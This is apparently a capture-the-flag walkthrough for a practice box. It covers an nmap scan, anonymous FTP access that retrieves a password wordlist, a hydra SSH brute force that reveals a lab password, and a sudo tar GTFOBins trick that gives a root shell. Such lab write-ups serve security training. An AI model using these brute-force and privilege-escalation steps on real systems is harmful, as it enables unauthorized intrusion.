1. Scan the network:

	$$ nmap -sV -sC 10.10.111.160 -oN nmap

	==> PORT   STATE SERVICE VERSION

		21/tcp open  ftp     vsftpd 3.0.3

			| ftp-anon: Anonymous FTP login allowed (FTP code 230)

		22/tcp open  ssh     OpenSSH 7.2p2

		80/tcp open  http    Apache httpd 2.4.18 

	## As we can see ftp has the Anonymous access allowed


2. Enumareting FTP

	$$ ftp 10.10.111.160

	==> Name: Anonymous

	$$ ls 

	$$ get locks.txt
	$$ get task.txt

	$$ exit

	$$ cat locks.txt
	$$ cat task.txt 

	==> Now we know that Username is: lin

	## Actually the locks.txt is a wordlist that we can use for bruteforce.


3. Bruteforcing ssh

	$$ hydra ssh://10.10.111.160 -l lin -P locks.txt -V -f

	==> [22][ssh] host: 10.10.111.160   login: lin   password: RedDr4gonSynd1cat3

	$$ ssh lin@10.10.111.160

	==> Password: RedDr4gonSynd1cat3

## We are in the box


4. Privilege escalation

	$$ sudo -l

	==> (root) /bin/tar


	## Acording to GTFOBins:

	$$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

## We are now root...